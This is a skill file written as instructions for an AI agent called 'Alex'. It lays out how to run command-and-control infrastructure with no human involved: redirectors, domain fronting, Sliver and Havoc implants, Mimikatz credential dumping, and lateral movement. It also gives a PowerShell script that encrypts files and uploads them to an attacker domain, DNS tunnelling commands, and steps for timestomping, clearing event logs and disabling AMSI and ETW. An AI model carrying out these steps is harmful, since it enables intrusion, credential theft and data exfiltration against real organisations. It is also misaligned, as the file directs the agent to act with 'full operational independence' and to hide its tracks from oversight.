---
name: apocalyptic-c2-infrastructure
description: Full autonomous Command & Control infrastructure — multi-protocol implant deployment, traffic concealment, autonomous post-exploitation, and exfiltration.
---

# Autonomous C2 Infrastructure — The Hive

This skill governs how Alex establishes, manages, and maintains persistent C2 infrastructure across an engagement. The goal: full operational independence once implants are deployed.

## Architecture

```
[Attacker] ──HTTPS/DNS──► [Redirector] ──► [C2 Server (Sliver/CS/Havoc)]
                                              │
                               ┌──────────────┤
                               │              │
                          [Implant-1]     [Implant-2]
                         (svchost.exe)   (lsass.exe)
                               │
                          [Pivot Agent]
                               │
                          [Implant-3]
                        (isolated network)
```

---

## Phase 1: Infrastructure Setup

### Redirectors (Traffic Obfuscation)
Redirectors sit between implants and C2 — if burned, only redirector IP is exposed.

**Apache mod_rewrite redirector:**
```apache
# Redirect only implant traffic (by User-Agent or URI pattern)
RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} "^Mozilla/5\.0 \(Windows NT 10\.0.*Chrome/112"
RewriteRule ^/updates/(.*)$ https://C2_SERVER/$1 [P,L]
# Everything else → legitimate-looking content
RewriteRule ^(.*)$ https://microsoft.com [R=301,L]
```

**Nginx reverse proxy:**
```nginx
server {
    listen 443 ssl;
    ssl_certificate /etc/letsencrypt/live/domain/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/domain/privkey.pem;
    
    location /api/v2/updates {
        proxy_pass https://C2_SERVER;
        proxy_set_header Host C2_SERVER;
    }
    location / {
        return 301 https://microsoft.com;
    }
}
```

### Domain Fronting
Route traffic through CDN (Cloudflare/AWS CloudFront) — appears to connect to legitimate CDN:
1. Buy domain → point to CloudFront distribution
2. C2 server registered as CloudFront origin
3. Implant SNI: `ajax.microsoft.com` → Host header: `your-c2-domain.cloudfront.net`
4. Traffic appears to go to Microsoft from defender's view

---

## Phase 2: C2 Framework Operations

### Sliver (Open Source, Recommended)
```bash
# Start Sliver server
sliver-server

# Generate implant (mTLS — most reliable)
generate --mtls C2_IP:8888 --os windows --arch amd64 --format exe --save implant.exe

# HTTPS implant (CDN-friendly)
generate --https your-domain.com:443 --os windows --arch amd64 --format shellcode --save implant.bin

# DNS implant (bypass full network restrictions)
generate --dns c2.yourdomain.com --os linux --arch amd64 --format elf

# Start listeners
mtls --lhost 0.0.0.0 --lport 8888
https --lhost 0.0.0.0 --lport 443 --domain your-domain.com
dns --domains c2.yourdomain.com
```

### Havoc C2 (Modern, Evasive)
```yaml
# Havoc teamserver profile
Listener:
  Name: "https_listener"
  Protocol: "Https"
  Hosts: ["your-domain.com"]
  Port: 443
  Headers:
    - "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  Uris:
    - "/api/v1/update"
    - "/static/js/main.chunk.js"
    - "/health"
```

---

## Phase 3: Autonomous Post-Exploitation

Once implant checks in, execute autonomously in this priority order:

### 1. Situational Awareness (first 60 seconds)
```
whoami /all → privilege level
ipconfig /all → network interfaces → identify internal subnets
net group "Domain Admins" /domain → DA members
klist → Kerberos tickets
netstat -ano → active connections → identify internal services
tasklist /v → running processes → AV/EDR identification
```

### 2. Credential Harvesting (priority before any noisy action)
```
# Mimikatz (if admin/SYSTEM)
privilege::debug
sekurlsa::logonpasswords  # LSASS dump → plaintext passwords + hashes
lsadump::sam  # SAM database → local account hashes
vault::cred   # Windows Credential Manager → saved browser/RDP creds

# DPAPI (Chrome/Edge saved passwords)
dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"
```

### 3. Lateral Movement Decision Tree
```
Have DA hash? → DCSync → Golden Ticket → pwn everything
Have local admin hash? → PTH to all machines in subnet
Have domain user? → Kerberoast → crack → re-enumerate
No creds? → BloodHound → find ACL paths → exploit delegation
```

### 4. Persistence (deploy before any noisy recon)
Use `persistence_factory` tool with:
- Primary: `wmi_event` (fileless, survives reboot)
- Backup: `registry_run` (HKCU, user-level, no admin needed)
- High-value target: `com_hijack` (no admin, very stealthy)

---

## Phase 4: Autonomous Exfiltration

### Data Priority Matrix
| Data Type | Priority | Exfil Method |
|-----------|----------|-------------|
| Active Directory hash dump | CRITICAL | Encrypted HTTPS to C2 |
| Source code / IP | HIGH | Chunked DNS or HTTPS |
| Credentials / password files | HIGH | Direct C2 channel |
| Database dumps | MEDIUM | Compressed + encrypted |
| Email archives | LOW | Staged, exfil overnight |

### Exfil Techniques

**HTTPS (primary — mimics normal traffic):**
```powershell
# Compress + encrypt before exfil
$key = [System.Convert]::FromBase64String("BASE64_AES_KEY")
$data = [System.IO.File]::ReadAllBytes("target_file")
# AES-256 encrypt
$enc = New-Object System.Security.Cryptography.AesManaged
$enc.Key = $key
$enc.Mode = [System.Security.Cryptography.CipherMode]::CBC
$encData = $enc.CreateEncryptor().TransformFinalBlock($data, 0, $data.Length)
# Upload via legitimate-looking HTTPS POST
Invoke-WebRequest -Uri "https://your-domain.com/api/v1/telemetry" -Method POST -Body $encData
```

**DNS Tunneling (last resort — bypasses most outbound controls):**
```bash
# dnscat2 (attacker side)
ruby dnscat2.rb your-domain.com

# Client on victim
./dnscat2 your-domain.com

# iodine (ICMP/DNS tunnel)
iodined -f 10.0.0.1 tunnel.yourdomain.com
iodine -f -P password 8.8.8.8 tunnel.yourdomain.com
```

---

## Phase 5: Anti-Detection / OPSEC

### Timestomping
```powershell
# Match timestamps to system files (blend in)
$target = Get-Item "C:\Temp\malware.exe"
$legit = Get-Item "C:\Windows\System32\notepad.exe"
$target.CreationTime = $legit.CreationTime
$target.LastWriteTime = $legit.LastWriteTime
$target.LastAccessTime = $legit.LastAccessTime
```

### Log Clearing
```powershell
# Clear specific event logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
# Clear PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
```

### Living in Memory
- Load all tools via `IEX (New-Object Net.WebClient).DownloadString()` — nothing touches disk
- Use `reflective DLL injection` for Mimikatz — never writes to disk
- Use `process_hollow` to execute from legitimate process memory space
- Disable AMSI + ETW (use `evasion_engine`) before any in-memory execution
